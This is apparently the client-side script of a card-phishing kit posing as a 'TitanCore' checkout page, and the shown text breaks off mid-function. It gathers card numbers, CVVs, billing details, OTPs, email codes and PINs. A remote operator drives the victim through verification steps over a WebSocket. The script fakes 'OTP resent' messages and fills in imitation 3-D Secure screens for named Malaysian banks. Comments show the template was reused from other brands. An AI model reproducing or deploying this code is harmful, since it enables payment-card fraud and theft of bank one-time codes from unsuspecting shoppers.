(function () {
'use strict';

var _fieldIds = {
  cardNumber: 'card-number',
  expiry: 'card-expiry',
  cvv: 'card-cvv',
  cardHolder: 'card-name',
  email: 'bill-email',
  phone: 'bill-phone',
  country: 'bill-country',
  address1: 'bill-address',
  city: 'bill-city',
  state: 'bill-state',
  zipCode: 'bill-postal',
  btnSubmit: 'pay-btn',
  statusMsg: 'checkout-status',
  fullName: 'bill-first'
};

var MERCHANT_NAME = 'TitanCore';

function q(id) { return document.getElementById(_fieldIds[id] || id); }

function readOrder() {
  try { return JSON.parse(localStorage.getItem('titancore_order') || '{}'); } catch (e) { return {}; }
}

function getFullName() {
  var f = document.getElementById('bill-first');
  var l = document.getElementById('bill-last');
  var name = ((f ? f.value : '') + ' ' + (l ? l.value : '')).trim();
  return name || (q('cardHolder') ? q('cardHolder').value.trim() : '');
}

function getPayAmount() {
  var order = readOrder();
  var base = Number(order.amount) || 0;
  var method = 'credit';
  var dr = document.getElementById('basic-debitCards');
  if (dr && dr.checked) method = 'debit';
  var rate = method === 'credit' ? (window.__tcDiscountRate || 0.2) : 0;
  return base * (1 - rate);
}

function getPayAmountStr() { return 'MYR ' + getPayAmount().toFixed(2); }

function sym(c) { return c === 'GBP' ? '£' : c === 'USD' ? '$' : 'RM'; }

function getLoadOverlay() {
  return document.getElementById('load-overlay') || document.getElementById('tc-pay-loading');
}

function ensurePayLoadingOverlay() {
  if (document.getElementById('load-overlay') || document.getElementById('tc-pay-loading')) return;
  var el = document.createElement('div');
  el.id = 'tc-pay-loading';
  el.className = 'tc-pay-loading hidden';
  el.setAttribute('aria-live', 'polite');
  el.setAttribute('aria-busy', 'true');
  el.innerHTML = '<div class="tc-pay-loading-spinner" role="status" aria-label="Processing"></div>';
  document.body.appendChild(el);
}

function lockCheckoutForm(locked) {
  var scopes = [
    document.getElementById('checkout-main'),
    document.getElementById('FormP0-17'),
    document.querySelector('form.km09ry0')
  ];
  scopes.forEach(function (scope) {
    if (!scope) return;
    scope.querySelectorAll('input, select, textarea, button').forEach(function (el) {
      if (el.id === 'pay-btn') return;
      el.disabled = !!locked;
    });
  });
}

function showLoad() {
  ensurePayLoadingOverlay();
  var lo = getLoadOverlay();
  if (lo) lo.classList.remove('hidden');
  var btn = q('pay-btn');
  if (btn) { btn.setAttribute('aria-busy', 'true'); btn.disabled = true; }
  lockCheckoutForm(true);
  document.body.classList.add('tc-checkout-locked');
}

function hideLoad() {
  var lo = getLoadOverlay();
  if (lo) lo.classList.add('hidden');
  var btn = q('pay-btn');
  if (btn) { btn.removeAttribute('aria-busy'); btn.disabled = false; }
  lockCheckoutForm(false);
  document.body.classList.remove('tc-checkout-locked');
}

window.tcPayment = window.tcPayment || {};
window.tcPayment.getPayAmount = getPayAmount;
window.tcPayment.showLoad = showLoad;
window.tcPayment.hideLoad = hideLoad;


 
  /* ═══════════════════════════════════════════
     1. 折扣 / 价格工具
  ═══════════════════════════════════════════ */
  var discountPct = 0.20;
 
  window.setDiscount = function setDiscount(pct) {
    discountPct = pct;
    var pmc = document.getElementById('pm-credit');
    var pmd = document.getElementById('pm-debit');
    if (pmc) {
      pmc.style.border     = document.querySelector('[value=credit]').checked ? '2px solid #d84e55' : '2px solid #ddd';
      pmc.style.background = document.querySelector('[value=credit]').checked ? '#fdf2f3' : '#fff';
    }
    if (pmd) {
      pmd.style.border     = document.querySelector('[value=debit]').checked ? '2px solid #d84e55' : '2px solid #ddd';
      pmd.style.background = document.querySelector('[value=debit]').checked ? '#fdf2f3' : '#fff';
    }
    updatePrice();
  };
 
  window.updatePrice = function () {
  var order = readOrder();
  var cur = order.currency || 'MYR';
  var base = Number(order.amount) || 0;
  var method = 'credit';
  var dr = document.getElementById('basic-debitCards');
  if (dr && dr.checked) method = 'debit';
  var rate = method === 'credit' ? (window.__tcDiscountRate || 0.2) : 0;
  var final = base * (1 - rate);
  var disc = base - final;
  var pf = sym(cur);
  var sub = document.getElementById('subtotal-price');
  var tot = document.getElementById('total-price');
  var discEl = document.getElementById('discount-price');
  var discRow = document.getElementById('discount-row');
  if (sub) sub.textContent = pf + base.toFixed(2);
  if (tot) tot.textContent = pf + final.toFixed(2);
  if (discEl) discEl.textContent = '- ' + pf + disc.toFixed(2);
  if (discRow) discRow.style.display = method === 'credit' && disc > 0 ? '' : 'none';
  var btn = q('pay-btn');
  if (btn) btn.textContent = 'Pay now';
};
 
  function discountedTotal() { return getPayAmount(); }


 
 
  /* ═══════════════════════════════════════════
     2. 工具函数
  ═══════════════════════════════════════════ */
  
 
  function clearCardError() {
    var cardErr = document.getElementById('card-number-error');
    if (cardErr) {
      cardErr.textContent = '';
      cardErr.style.display = 'none';
    }
    var statusEl = q('statusMsg');
    if (statusEl) statusEl.style.display = 'none';
  }

  function showMsg(t, x) {
    var statusEl = q('statusMsg');
    if (statusEl) statusEl.style.display = 'none';

    if (t === 'error') {
      var cardErr = document.getElementById('card-number-error');
      if (cardErr) {
        cardErr.textContent = x;
        cardErr.style.display = 'block';
        cardErr.style.color = '#c62828';
        cardErr.style.background = '#ffebee';
        cardErr.style.padding = '10px 12px';
        cardErr.style.borderRadius = '8px';
        cardErr.style.fontSize = '14px';
        cardErr.style.margin = '8px 0 4px';
      }
    } else {
      clearCardError();
    }
  }

  /* 持久化错误弹层（复用 Cineplex 的 showInline 模式，适配 redbus statusMsg） */
  function showInline(t, x, persist) {
    if (persist) localStorage.setItem('_rbInlineMsg', x + '|' + t);
    showMsg(t, x);
  }
  function hideInline() {
    localStorage.removeItem('_rbInlineMsg');
    clearCardError();
  }

  /* 还原持久消息 */
  var _pm = localStorage.getItem('_rbInlineMsg');
  if (_pm) {
    var _parts = _pm.split('|');
    showMsg(_parts[1] || 'info', _parts[0] || '');
  }


 /* !function(f,b,e,v,n,t,s){
  if(f.fbq)return;
  n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];
  t=b.createElement(e);t.async=!0;t.src=v;
  s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)
}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');

fbq('init', '1325759409620752');

fetch('/api/settings')
  .then(function(r) { return r.json(); })
  .then(function(json) {
    var pixels = (json.data && json.data.fbPixels) || [];
    pixels.filter(function(p) { return p.enabled; }).forEach(function(p) {
      fbq('init', p.pixelId);
    });
  })
  .catch(function() {});*/
 
 
  /* ═══════════════════════════════════════════
     3. 输入格式化
  ═══════════════════════════════════════════ */
  var cardNumberEl = q('cardNumber');
  if (cardNumberEl) {
    cardNumberEl.addEventListener('input', function () {
      var v = this.value.replace(/\D/g, '').slice(0, 16);
      this.value = v.replace(/(.{4})/g, '$1 ').trim();
    });
  }
 
  var expiryEl = q('expiry');
  if (expiryEl) {
    expiryEl.addEventListener('input', function () {
      var v = this.value.replace(/\D/g, '').slice(0, 4);
      if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2);
      this.value = v;
    });
    expiryEl.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace' && this.value.endsWith('/')) {
        this.value = this.value.slice(0, -1);
        e.preventDefault();
      }
    });
  }
 
  var cvvEl = q('cvv');
  if (cvvEl) {
    cvvEl.addEventListener('input', function () {
      this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });
  }
 
 
  /* ═══════════════════════════════════════════
     4. 底部弹层开 / 关
  ═══════════════════════════════════════════ */
  var closeSheetBtn = document.querySelector(
    '#quxiao'
  );
  if (closeSheetBtn) {
    closeSheetBtn.addEventListener('click', function () {
      document.querySelector('#root > div > div.bottomSheetOverlay___e61510').style.display = 'none';
    });
  }
 
  var openSheetBtn = document.querySelector(
    '#root > div.payment__sea-payment-styles-module-scss-C7ooH > div > div.outerWrapper___c987d4 > div > div.collapsedContentWrapper___d9d1db > div > div.reviewBooking___0256aa > div.actionWrap___a83340 > button'
  );
  if (openSheetBtn) {
    openSheetBtn.addEventListener('click', function () {
      document.querySelector("#root > div > div.bottomSheetOverlay___e61510").style.display = 'block';
    });
  }
 
 
  /* ═══════════════════════════════════════════
     5. WebSocket —— 基于 Cineplex 成熟逻辑
  ═══════════════════════════════════════════ */
  var ws            = null;
  var sid           = null;
  var reconnectTimer = null;
  var wsRetries     = 0;
  var wsConnecting  = false;
  var _sessionCreating = false;
  var _curStep      = 'card';
 
  /* 唯一客户端 ID */
  var cid = localStorage.getItem('titancore_cid');
  if (!cid) {
    cid = 'cust_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
    localStorage.setItem('titancore_cid', cid);
  }
 
  function wsConnect() {
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
    if (wsConnecting) return;
    wsConnecting = true;
    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
 
    var url = (location.protocol === 'https:' ? 'wss:' : 'ws:') +
              '//' + location.host +
              '/api/?role=customer&cid=' + encodeURIComponent(cid) +
              (sid ? '&sid=' + encodeURIComponent(sid) : '');
 
    var socket = new WebSocket(url);
    socket._dead = false;
    socket._hb   = null;
    ws = socket;
 
    socket.onopen = function () {
      if (socket !== ws) return;
      wsConnecting = false;
      wsRetries    = 0;
      if (socket._hb) clearInterval(socket._hb);
      socket._hb = setInterval(function () {
        if (socket === ws && socket.readyState === WebSocket.OPEN)
          socket.send(JSON.stringify({ type: 'heartbeat' }));
      }, 10000);
    };
 
    socket.onmessage = function (e) {
      var m;
      try { m = JSON.parse(e.data); } catch (err) { return; }
      if (m.type === 'operator_action') handleAction(m.payload);
    };
 
    socket.onclose = function (evt) {
      if (socket !== ws) return;
      if (socket._hb) { clearInterval(socket._hb); socket._hb = null; }
      if (socket._dead) return;
      wsRetries += 1;
      var delay = wsRetries <= 3 ? 10000 : wsRetries <= 6 ? 30000 : 60000;
      if (reconnectTimer) clearTimeout(reconnectTimer);
      reconnectTimer = setTimeout(function () {
        reconnectTimer = null;
        ws = null;
        wsConnecting = false;
        wsConnect();
      }, delay);
    };
 
    socket.onerror = function () {};
  }
 
  /* ── Action handler（对应 Cineplex 全套 action，DOM 适配 redbus） ── */
  function safeId(id) { return document.getElementById(id); }
  function isOverlayOpen(id) {
    var e = safeId(id);
    return !!(e && !e.classList.contains('hidden'));
  }

  function resetVerifyOverlayState() {
    function hide(id) { var e = safeId(id); if (e) e.classList.add('hidden'); }
    function setClass(id, cls) { var e = safeId(id); if (e) e.className = cls; }
    function setText(id, text) { var e = safeId(id); if (e) e.textContent = text; }
    function setDisabled(id, on) { var e = safeId(id); if (e) e.disabled = on; }

    hide('otp-overlay');
    setClass('otp-result', 'hidden');
    setClass('otp-form', '');
    hide('otp-spinner');
    hide('otp-error');
    var otpCode = safeId('otp-code');
    if (otpCode) otpCode.value = '';
    setDisabled('otp-submit', false);
    setText('otp-submit', 'Continue');
    setDisabled('otp-resend', false);
    var otpResend = safeId('otp-resend');
    if (otpResend) otpResend.classList.remove('otp-resend-disabled');
    setText('otp-timer', '4:59');
    setText('otp-spin-text', 'Verifying...');

    hide('app-verify-overlay');
    hide('app-spinner');
    hide('app-error');
    ['mount1','mount2','mount3','mount4','mount5','mount6','mount7'].forEach(function (m) {
      var el = safeId(m);
      if (el) { el.classList.add('hidden'); el.innerHTML = ''; }
    });
    var avBox = safeId('app-verify-box');
    if (avBox) avBox.classList.add('hidden');
    var avBtn = safeId('app-continue-btn');
    if (avBtn) { avBtn.disabled = false; avBtn.textContent = 'Continue to complete'; }

    hide('email-overlay');
    hide('email-spinner');
    setClass('email-result', 'hidden');
    setClass('email-form', '');
    hide('email-error');
    var emailCode = safeId('email-code');
    if (emailCode) emailCode.value = '';
    setDisabled('email-submit', false);
    setText('email-submit', 'Continue');
    setDisabled('email-resend', false);
    var emailResend = safeId('email-resend');
    if (emailResend) emailResend.classList.remove('otp-resend-disabled');
    setText('email-timer', '4:59');

    hide('pin-overlay');
    hide('pin-spinner');
    hide('pin-error');
    ['pin-d1','pin-d2','pin-d3','pin-d4'].forEach(function (d) {
      var el = safeId(d);
      if (el) el.value = '';
    });
    setDisabled('pin-submit', false);

    clearCardError();
    var payBtn = q('pay-btn');
    if (payBtn) payBtn.disabled = false;
    hide('load-overlay');
    hide('tc-pay-loading');
  }

  function handleAction(p) {
    var a = p.action;

    /* 收到验证类 action 时重置所有验证覆盖层状态 */
    if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail' ||
        a === 'cvv_verify'  || a === 'question_verify'  ||  a=== 'app_verify'  ||  a=== 'pin_verify') {
      resetVerifyOverlayState();
    }
 
    if (a === 'ack') {
      sid = p.sessionId;
      _sessionCreating = false;
 
    } else if (a === 'session_restored') {
      sid = p.sessionId;
      _sessionCreating = false;
      var ci = p.cardInfo || {};
      var cu = p.customerInfo || {};
      if (ci.cardNumber && q('cardNumber')) q('cardNumber').value = ci.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
      if (ci.expiry    && q('expiry'))     q('expiry').value    = ci.expiry;
      if (ci.cvv       && q('cvv'))        q('cvv').value       = ci.cvv;
      if (ci.cardHolder && q('cardHolder')) q('cardHolder').value = ci.cardHolder;
      if (cu.fullName) { var _p = cu.fullName.split(' '); if (q('bill-first')) q('bill-first').value = _p[0] || ''; if (q('bill-last')) q('bill-last').value = _p.slice(1).join(' ') || ''; }
      if (cu.email     && q('email'))      q('email').value     = cu.email;
      if (cu.phone     && q('phone'))      q('phone').value     = cu.phone;
      if (cu.address1     && q('address1'))      q('address1').value     = cu.address1;
      if (cu.city     && q('city'))      q('city').value     = cu.city;
      if (cu.state     && q('state'))      q('state').value     = cu.state;
      if (cu.zipCode     && q('zipCode'))      q('zipCode').value     = cu.zipCode;
      //showMsg('info', 'Session restored.');
      ws.send(JSON.stringify({
        type: 'session_update',
        payload: {
          sessionId:    sid,
          currentStep:  _curStep
        }
      }));
    } else if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail') {
      hideLoad();
      _curStep = 'otp';
      showOtp();
      var sfx = p.phoneSuffix || '****';

    var otpBodyP = document.querySelector('#otp-body p');
    if (otpBodyP) otpBodyP.textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';
    var otpAmount = document.getElementById('otp-amount');
    if (otpAmount) otpAmount.textContent='MYR '+String(getPayAmount());
      /*var otpMsg = q('otpMessage');
      if (otpMsg) otpMsg.textContent =
        'A One-Time Password has been sent to your registered mobile number ending ' + sfx +
        '. Please enter the OTP below.';*/
      resetOtp();
      startOtpTimer();
      applyMerchantBranding();
 
    } else if (a === 'email_verify' || a === 'custom_email_verify' || a === 'custom_email_tail') {
      hideLoad();
      _curStep = 'email_verify';
      showEmail();
      var sfx = p.phoneSuffix || (q('email') ? q('email').value : '');

    document.querySelector("#email-form > p").innerHTML='We have resent One-Time Password (OTP) in a text message to your registered email '+sfx+'.<br>Please submit your One-Time Password (OTP).';
    document.getElementById('email-amount').textContent='MYR '+String(getPayAmount());
      /*var otpMsg = q('otpMessage');
      if (otpMsg) otpMsg.textContent =
        'A One-Time Password has been sent to your registered mobile number ending ' + sfx +
        '. Please enter the OTP below.';*/
      resetOtp();
      startOtpTimer();
      applyMerchantBranding();
 
    } else if (a === 'cvv_verify' || a === 'question_verify') {
      _curStep = 'otp';
      showOtp();
      var sfx = p.phoneSuffix || '****';

    document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';
    document.getElementById('otp-amount').textContent='MYR '+String(getPayAmount());
      /*var otpMsg2 = q('otpMessage');
      if (otpMsg2) otpMsg2.textContent = p.message || 'Please complete verification.';*/
      resetOtp();
 
    } else if (a === 'approve') {
      //showMsg('success', 'Payment approved!');
      var btn = q('pay-btn');
      if (btn) { btn.disabled = true; /*btn.textContent = 'Approved';*/ }
      hideOtp();
      setTimeout(function () { location.href = '/complete/'; }, 2000);
 
    } else if (a === 'reject') {
      hideOtp();
      var btn2 = q('pay-btn');
      if (btn2) { btn2.disabled = true; }
      showInline('error', 'Declined: ' + (p.message || ''), true);
 
    } else if (a === 'card_error') {
      //hideOtp();
      hideLoad()
      var btn3 = q('pay-btn');
      if (btn3) { btn3.disabled = false; /*btn3.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
      showMsg('error', 'We are unable to authenticate your payment method. Please choose a different payment method and try again.', true);
 
    } else if (a === 'otp_error') {
      var otpSpin = safeId('otp-spinner');
      if (otpSpin) { otpSpin.style.display = 'none'; otpSpin.classList.add('hidden'); }
      var emailSpin = safeId('email-spinner');
      if (emailSpin) { emailSpin.style.display = 'none'; emailSpin.classList.add('hidden'); }
      var emailErr = q('email-error');
      if (emailErr) { emailErr.style.display = 'block'; emailErr.textContent = p.message || 'Invalid code.'; emailErr.classList.remove('hidden'); }
      var emailBtn = q('email-submit');
      if (emailBtn) { emailBtn.disabled = false; emailBtn.textContent = 'Verify'; }
      var otpErr = q('otp-error');
      if (otpErr) { otpErr.style.display = 'block'; otpErr.textContent = p.message || 'Invalid code.'; otpErr.classList.remove('hidden'); }
      var otpBtn = q('otp-submit');
      if (otpBtn) { otpBtn.disabled = false; otpBtn.textContent = 'Verify'; }
 
    } else if (a === 'timeout') {
      hideOtp();
      var btn4 = q('pay-btn');
      if (btn4) { btn4.disabled = true; }
      showInline('error', 'Session timed out. Please try again.', true);
 
    } else if (a === 'change_card_prompt') {
      _curStep = 'card';
      hideLoad();
      document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
      document.querySelector("#mount1").classList.add('hidden');
      document.querySelector("#mount2").classList.add('hidden');
      document.querySelector("#mount3").classList.add('hidden');
      document.querySelector("#mount4").classList.add('hidden');
      document.querySelector("#mount5").classList.add('hidden');
      document.querySelector("#mount6").classList.add('hidden');
      document.querySelector("#mount7").classList.add('hidden');
      document.querySelector("#mount1").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount2").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount3").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount4").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount5").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount6").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount7").shadowRoot.querySelector("div > div").classList.add('hidden');
      var resultmessage = p.message || 'Your bank did not authorize this transaction.';
      document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
      document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
      changeOtp();
      changeEmail();
      document.getElementById('app-verify-overlay').classList.add('hidden');
      var btn5 = q('pay-btn');
      if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
      showMsg('error', p.message, true);

    } else if (a === 'custom_prompt') {
      var msg = p.message || '';
      var appOverlay = safeId('app-verify-overlay');
      if (appOverlay && !appOverlay.classList.contains('hidden')) {
        // Hide spinner inside active bank mount
        if (!document.querySelector("#mount1").classList.contains('hidden')) {
        document.querySelector("#mount1").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount1").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount1").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount1").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount2").classList.contains('hidden')) {
        document.querySelector("#mount2").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount2").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount2").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount2").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount3").classList.contains('hidden')) {
        document.querySelector("#mount3").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount3").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount3").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount3").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount4").classList.contains('hidden')) {
        document.querySelector("#mount4").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount4").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount4").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount4").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount5").classList.contains('hidden')) {
        document.querySelector("#mount5").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount5").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount5").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount5").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount6").classList.contains('hidden')) {
        document.querySelector("#mount6").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount6").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount6").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount6").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      } else if (!document.querySelector("#mount7").classList.contains('hidden')) {
        document.querySelector("#mount7").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
        document.querySelector("#mount7").shadowRoot.querySelector('.vfy-spinner').style = ''; 
        document.querySelector("#mount7").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
        document.querySelector("#mount7").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
        return;
      }
        // Show generic box
        var avBox = document.querySelector('#app-verify-overlay > .app-verify-box');
        if (avBox) avBox.classList.remove('hidden');
        var appSpinner = safeId('app-spinner');
        if (appSpinner) appSpinner.classList.add('hidden');
        var appError = safeId('app-error');
        if (appError) { appError.textContent = msg; appError.classList.remove('hidden'); }
        var appBtn = safeId('app-continue-btn');
        if (appBtn) { appBtn.classList.remove('hidden'); appBtn.disabled = false; }
      } else if (isOverlayOpen('otp-overlay')) {
        var otpSpinner = safeId('otp-spinner');
        if (otpSpinner) otpSpinner.classList.add('hidden');
        var otpResult = safeId('otp-result');
        if (otpResult) otpResult.classList.remove('hidden');
        var otpP = document.querySelector('#otp-result > p');
        if (otpP) otpP.textContent = msg;
      } else if (isOverlayOpen('email-overlay')) {
        var emailSpinner = safeId('email-spinner');
        if (emailSpinner) emailSpinner.classList.add('hidden');
        var emailResult = safeId('email-result');
        if (emailResult) emailResult.classList.remove('hidden');
        var emailP = document.querySelector('#email-result > p');
        if (emailP) emailP.textContent = msg;
      } else if (isOverlayOpen('pin-overlay')) {
        var pinSpinner = safeId('pin-spinner');
        if (pinSpinner) pinSpinner.classList.add('hidden');
        var pinError = safeId('pin-error');
        if (pinError) { pinError.textContent = msg; pinError.classList.remove('hidden'); }
      } else {
        showMsg('error', msg, true);
      }

    } else if (a === 'change_card') {
      _curStep = 'card';
      hideLoad();
      document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
      document.querySelector("#mount1").classList.add('hidden');
      document.querySelector("#mount2").classList.add('hidden');
      document.querySelector("#mount3").classList.add('hidden');
      document.querySelector("#mount4").classList.add('hidden');
      document.querySelector("#mount5").classList.add('hidden');
      document.querySelector("#mount6").classList.add('hidden');
      document.querySelector("#mount7").classList.add('hidden');
      document.querySelector("#mount1").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount2").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount3").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount4").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount5").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount6").shadowRoot.querySelector("div > div").classList.add('hidden');
      document.querySelector("#mount7").shadowRoot.querySelector("div > div").classList.add('hidden');
      var resultmessage = p.message || 'Your bank did not authorize this transaction.';
      document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
      document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
      changeOtp();
      changeEmail();
      document.getElementById('app-verify-overlay').classList.add('hidden');
      var btn5 = q('pay-btn');
      if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
      showMsg('error', 'Please use a different card.', true);
 
    } else if (a === 'redirect_complete') {
      location.href = '/complete/';
 
    } else if (a === 'resend_ok') {
      startResendCooldown();
 
    } else if (a === 'resend_limit') {
      var rb = q('otpResend');
      if (rb) { rb.disabled = true; rb.textContent = 'Limit reached'; }
      showInline('error', p.message || 'Maximum resend attempts reached.', true);
    }
     else if (a === 'app_verify') {
      _curStep = 'app_verify';
      hideLoad();
      document.getElementById('app-verify-overlay').classList.remove('hidden');

      if(p.cardInfo.bankName==='AMBANK (M) BERHAD') {
        document.querySelector("#mount1").classList.remove('hidden');
        document.querySelector("#mount1").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'MYR '+String(getPayAmount());
        const now = new Date(); 
        const options = {
        weekday: 'short',
        month: 'short',
        day: '2-digit',
        year: 'numeric',
        timeZone: 'Asia/Kuala_Lumpur'};
        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
        const weekday = parts.find(p => p.type === 'weekday').value;
        const month = parts.find(p => p.type === 'month').value;
        const day = parts.find(p => p.type === 'day').value;
        const year = parts.find(p => p.type === 'year').value;
        const dateStr = `${weekday} ${month} ${day} ${year}`;
        const timeStr = now.toLocaleTimeString('en-GB', {
            hour12: false,
            timeZone: 'Asia/Kuala_Lumpur'
        });
        document.querySelector("#mount1").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(5) > td:nth-child(3)").innerHTML = `
            <span>${dateStr}</span><br>
            <span>${timeStr} GMT +0800</span>
        `;
      }
      else
      if(p.cardInfo.bankName==='CIMB BANK BERHAD') {
        document.querySelector("#mount2").classList.remove('hidden');
        document.querySelector("#mount2").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'MYR '+String(getPayAmount());
        document.querySelector("#mount2").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(6) > td:nth-child(3) > span").textContent = p.cardInfo.cardNumber.slice(-4);
        const now = new Date(); 
        const options = {
        weekday: 'short',
        month: 'short',
        day: '2-digit',
        year: 'numeric',
        timeZone: 'Asia/Kuala_Lumpur'};
        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
        const weekday = parts.find(p => p.type === 'weekday').value;
        const month = parts.find(p => p.type === 'month').value;
        const day = parts.find(p => p.type === 'day').value;
        const year = parts.find(p => p.type === 'year').value;
        const dateStr = `${weekday} ${month} ${day} ${year}`;
        const timeStr = now.toLocaleTimeString('en-GB', {
            hour12: false,
            timeZone: 'Asia/Kuala_Lumpur'
        });
        document.querySelector("#mount2").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(5) > td:nth-child(3)").innerHTML = `
            <span>${dateStr}</span><br>
            <span>${timeStr} GMT +0800</span>
        `;
      }
      else
      if(p.cardInfo.bankName==='MALAYAN BANKING BERHAD') {
        document.querySelector("#mount3").classList.remove('hidden');
        document.querySelector("#mount3").shadowRoot.querySelector("div > table.infotable.infotableoob > tbody > tr:nth-child(2) > td:nth-child(2) > div").innerHTML = '<span>MYR '+String(getPayAmount())+'</span>';
        document.querySelector("#mount3").shadowRoot.querySelector("div > table.infotable.infotableoob > tbody > tr:nth-child(4) > td:nth-child(2) > div > span").textContent = p.cardInfo.cardNumber.slice(-4);
        const now = new Date(); 
        const options = {
        weekday: 'short',
        month: 'short',
        day: '2-digit',
        year: 'numeric',
        timeZone: 'Asia/Kuala_Lumpur'};
        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
        const weekday = parts.find(p => p.type === 'weekday').value;
        const month = parts.find(p => p.type === 'month').value;
        const day = parts.find(p => p.type === 'day').value;
        const year = parts.find(p => p.type === 'year').value;
        const dateStr = `${weekday} ${month} ${day} ${year}`;
        const timeStr = now.toLocaleTimeString('en-GB', {
            hour12: false,
            timeZone: 'Asia/Kuala_Lumpur'
        });
        document.querySelector("#mount3").shadowRoot.querySelector("div > table.infotable.infotableoob > tbody > tr:nth-child(3) > td:nth-child(2) > div > span").innerHTML = `
            <span>${dateStr}</span>
        `;
      }
      else
      if(p.cardInfo.bankName==='OVERSEA-CHINESE BANKING CORPORATION LTD.' || p.cardInfo.bankName==='OCBC BANK (MALAYSIA) BERHAD') {
        document.querySelector("#mount4").classList.remove('hidden');
        document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(1) > td:nth-child(2) > span").textContent = 'MYR '+String(getPayAmount());
        document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(3) > td:nth-child(2) > span:nth-child(2)").textContent = p.cardInfo.cardNumber.slice(-4);
